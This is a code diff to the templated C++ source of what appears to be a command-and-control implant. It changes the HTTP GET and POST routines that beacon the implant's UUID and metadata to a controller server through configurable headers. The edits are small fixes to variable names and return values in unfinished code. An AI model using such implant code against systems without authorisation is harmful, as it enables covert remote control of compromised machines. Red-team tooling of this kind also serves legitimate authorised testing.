@@ -45,7 +45,8 @@ nlohmann::json get(std::string implant_uuid) {
     create_metadata(metadata_map, metadata_as_msgpack);
 
     // Hold bytes in string, as all the transforms want a string
-    std::string transformed_metadata_for_server(metadata_as_msgpack.begin(), metadata_as_msgpack.end());
+    // do NOT change the `metadata` var name prior to templating, it's needed for it
+    std::string metadata(metadata_as_msgpack.begin(), metadata_as_msgpack.end());
     std::vector<std::wstring> headers;
 
     // --- Transforms ---
@@ -56,7 +57,7 @@ nlohmann::json get(std::string implant_uuid) {
 
     [# IF MC2 says it wants a header for where to find the metadata... #]
     [%- if http_get_client_metadata_terminator == "header" %]
-    headers.push_back(L"[[ http_get_client_metadata_terminator_value ]]: " + std::wstring(transformed_metadata_for_server.begin(), transformed_metadata_for_server.end()));
+    headers.push_back(L"[[ http_get_client_metadata_terminator_value ]]: " + std::wstring(metadata.begin(), metadata.end()));
     [%- endif %]
 
     if (HTTP_GET(headers, http_response_buffer)) {
@@ -71,6 +72,9 @@ nlohmann::json get(std::string implant_uuid) {
         jinja if that field...
         else
         */
+
+        //This variable should hold the output of the http request
+        std::string output;
 
         // TODO: transform from raw data - NOTE! Use reverse funcs, as this is data coming back from server
         // --- Reverse Transforms ---
@@ -142,5 +146,5 @@ int post(std::string implant_uuid, std::string output_data, std::string task_uui
         std::cout << "Error occured posting data";
     };
     
-    // return 0;
+    return 0;
 }
